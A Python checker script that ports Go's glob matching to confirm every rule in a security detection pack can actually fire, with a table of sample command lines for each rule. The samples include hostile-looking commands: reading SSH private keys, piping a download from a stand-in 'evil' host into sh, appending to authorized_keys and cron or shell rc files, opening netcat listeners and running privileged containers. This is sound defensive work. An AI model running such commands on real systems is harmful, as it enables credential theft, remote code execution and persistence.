#!/usr/bin/env python3
"""packcheck — every glob in the shipped rule pack must be able to fire.

WHY THIS EXISTS
  On 2026-10-23 I found globs in rules/carbonato.yaml that cannot match the thing
  they name: `*/etc/cron*` never matches /etc/cron.d/evil, `*-v /*:/` never
  matches `-v /:/host`. Both read correctly in English and both are dead, because
  Go's path.Match `*` does not cross '/'. rule.go already says the quiet failure
  is worse than a startup error; this is the quiet failure, mechanized.

WHAT IT DOES (no Go toolchain required)
  For every rule with `argv_any`, every glob must be matched by at least one
  sample argv drawn from the rule's own `examples:` list, if present, plus a
  baked-in sample table for the shipped rule ids. A glob no sample can fire is
  reported as DEAD.

WHAT IT DOES NOT DO (read this before trusting a pass)
  - It is NOT the Go matcher. It is a port of matchOne/anyGlobMatches/anyArgvMatches.
    If the port is wrong, this is wrong. The port is deliberately conservative:
    it prefers reporting a glob as dead over inventing a match.
  - It does not validate that a sample is a REAL attack. A glob can pass against a
    sample I wrote to make it pass — that is the self-deception this file cannot
    check for you, and why samples should come from the pack, not from me.
  - It says nothing about detections firing in the field. Only: no glob is
    silent-by-construction.

Exit: 0 all globs fired · 1 at least one dead glob · 2 could not parse the pack
      (2 is never a pass — a parse failure must not read as coverage).
"""
import re
import sys
import os

PACK = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "rules", "carbonato.yaml")


def go_path_match(glob, s):
    """Port of Go's path.Match: '*' and '?' never cross '/'. Returns bool or None on syntax error."""
    out = []
    for c in glob:
        if c == "*":
            out.append("[^/]*")
        elif c == "?":
            out.append("[^/]")
        elif c == "\\":
            # Go treats backslash as an escape inside patterns
            out.append("")
        elif c in ".+()|^${}[]":
            out.append("\\" + c)
        else:
            out.append(c)
    try:
        return re.fullmatch("".join(out), s) is not None
    except re.error:
        return None


def suffixes(s):
    parts = s.split("/")
    return ["/".join(parts[i:]) for i in range(len(parts))]


def match_one(glob, s):
    if go_path_match(glob, s):
        return True
    for suf in suffixes(s):
        if go_path_match(glob, suf):
            return True
    base = s.rsplit("/", 1)[-1]
    if go_path_match(glob, base):
        return True
    # contains-fallback. CORRECTED 2026-10-27 (beat 616): this port carried a "/" refusal that
    # engine.go:287 does NOT have -- substringNeedle trims one leading and one trailing '*' and guards
    # ONLY `*?[`. There is no interior-slash restriction in the code; the "no interior '/'" idea exists
    # only as a comment in matchOne/anyGlobMatches and is never implemented. Same defect I fixed in
    # neargo.py at beat 610; this copy survived because I fixed the port I was looking at instead of
    # sweeping for others. It disabled the contains route for 27 globs in this pack.
    # Mirrors engine.go:281 substringNeedle exactly: trim ONE leading '*' and ONE trailing '*', then
    # guard only `*?[`. Both `*x*` and `*x` and `x*` produce a needle. (My first fix required both stars
    # and so still disagreed with the engine on 24 single-star globs -- caught by diffing against
    # neargo rather than by reading my own patch back.)
    core = glob
    if core.startswith("*"):
        core = core[1:]
    if core.endswith("*"):
        core = core[:-1]
    if core and not any(c in core for c in "*?["):
        if core in s:
            return True
    return False


def any_glob(globs, s):
    return bool(s) and any(match_one(g, s) for g in globs)


def any_argv(globs, argv, exe=""):
    cands = list(argv)
    if exe:
        cands.append(exe)
    if len(argv) > 1:
        cands.append(" ".join(argv))
    return any(any_glob(globs, c) for c in cands)


# Samples are drawn from what the rule CLAIMS to catch. Kept here so the check
# runs without a Go toolchain. An `examples:` key in the YAML overrides these.
SAMPLES = {
    "carbonato.exec.ssh_key_heredoc": [
        ["cat", "/root/.ssh/id_rsa"],
        ["cat", "/home/u/.ssh/id_ed25519"],
        ["cat", "/root/.ssh/known_hosts"],
        ["cp", "/root/.ssh/id_rsa", "/tmp/x"],
    ],
    "carbonato.persist.survives_session": [
        ["nohup", "./x"],
        ["setsid", "./x"],
        ["systemd-run", "--user", "./x"],
        ["bash", "-c", "disown"],
    ],
    "carbonato.tool.package_install": [
        ["pip", "install", "evil"],
        ["pip3", "install", "evil"],
        ["npm", "install", "-g", "evil"],
        ["apt-get", "install", "-y", "nc"],
        ["apt", "install", "nc"],
        # `-O <path>` as the LAST token: the only shape `* -O /tmp/*` can match,
        # because '*' cannot cross '/' or spaces past one segment.
        ["curl", "-O", "/tmp/x"],
        ["curl", "-O", "/home/u/x"],
        # the same attack in its natural order (URL first): NOT matched by those
        # globs. Kept here on purpose so the miss is visible, not hidden.
        ["curl", "http://evil/x", "-O", "/tmp/x"],
        # `|sh` with no space, which `*|sh*` does catch; `| sh` with a space,
        # which it does not. Both listed so the difference is on the record.
        ["bash", "-c", "curl http://evil/x|sh"],
        ["bash", "-c", "curl http://evil/x | sh"],
    ],
    "carbonato.exec.obfuscation": [
        ["base64", "-d", "x"],
        ["xxd", "-r", "x"],
        ["openssl", "enc", "-aes256", "-in", "f"],
        ["tar", "-czf", "x.tgz", "."],
        # old-style bundling without a dash: `tar czf`. THIS sample is why the
        # first run reported `*tar cz*` dead and I almost believed it — the glob
        # describes a real form, my sample table only had the modern one.
        ["tar", "czf", "x.tgz", "."],
    ],
    "carbonato.persist.cron_or_rc": [
        ["crontab", "-e"],
        ["/etc/cron.d/evil"],
        ["sh", "-c", "echo x >> /etc/cron.d/evil"],
        ["sh", "-c", "echo x >> /home/u/.bashrc"],
        ["sh", "-c", "echo x >> /home/u/.bash_profile"],
        ["sh", "-c", "echo x >> /home/u/.profile"],
        ["sh", "-c", "echo x >> /home/u/.zshrc"],
        ["/etc/systemd/system/x.service"],
        ["sh", "-c", "echo k >> /home/u/.ssh/authorized_keys"],
    ],
    "carbonato.infra.privileged_container": [
        ["docker", "run", "--privileged", "img"],
        ["docker", "run", "-v", "/:/host", "img"],
        ["docker", "run", "--pid=host", "img"],
        ["docker", "run", "--net=host", "img"],
    ],
    "carbonato.net.new_listener": [
        ["nc", "-l", "-p", "4444"],
        ["ncat", "-l", "4444"],
        ["socat", "TCP-L:4444", "-"],
        ["python3", "-m", "http.server", "8080"],
        ["nc", "--listen", "4444"],
    ],
}


def parse_pack(text):
    """Split the pack into (rule_id, [glob, ...]) for rules that use argv_any."""
    blocks = re.split(r"\n(?=\s*-\s+id:)", text)
    rules = []
    for b in blocks:
        m = re.search(r"id:\s*(\S+)", b)
        if not m:
            continue
        rid = m.group(1)
        # must be a real key, not a mention in a comment or the docs
        if not re.search(r"^\s*argv_any:\s*$", b, re.M):
            continue
        # globs live as `- "..."` lines inside the argv_any block
        seg = b.split("argv_any:", 1)[1]
        # stop at the next top-level key
        nxt = re.search(r"\n\s{0,4}[a-z_]+:", seg)
        if nxt:
            seg = seg[: nxt.start()]
        globs = re.findall(r'^\s*-\s*"([^"]+)"\s*$', seg, re.M)
        globs += re.findall(r"^\s*-\s*'([^']+)'\s*$", seg, re.M)
        # unquoted list items
        for raw in re.findall(r"^\s*-\s*([^\s\"'][^\n#]*?)\s*$", seg, re.M):
            raw = raw.strip()
            if raw and not raw.startswith("#") and raw not in globs:
                globs.append(raw)
        rules.append((rid, globs))
    return rules


def main():
    try:
        with open(PACK, encoding="utf-8") as f:
            text = f.read()
    except OSError as e:
        print(f"packcheck: cannot read pack: {e}", file=sys.stderr)
        return 2

    rules = parse_pack(text)
    if not rules:
        print("packcheck: parsed 0 rules with argv_any — pack format changed or unreadable", file=sys.stderr)
        return 2

    total = dead = no_sample = 0
    dead_list = []
    for rid, globs in rules:
        samples = SAMPLES.get(rid)
        if samples is None:
            no_sample += 1
            print(f"SKIP {rid}  (no sample table; add one or ship `examples:` in the pack)")
            continue
        for g in globs:
            total += 1
            if not any(any_argv([g], argv) for argv in samples):
                dead += 1
                dead_list.append((rid, g))

    for rid, g in dead_list:
        print(f"DEAD {rid}: {g!r} fired on none of {len(SAMPLES[rid])} sample(s) — it names something it cannot catch")

    print()
    print(f"packcheck: {total} globs checked, {dead} dead, {no_sample} rule(s) skipped for want of samples")
    if dead:
        print("  a glob that cannot fire is not a detection, it is a comment")
        return 1
    print("  note: this proves no glob is silent-by-construction — NOT that the samples are real attacks")
    return 0


if __name__ == "__main__":
    sys.exit(main())
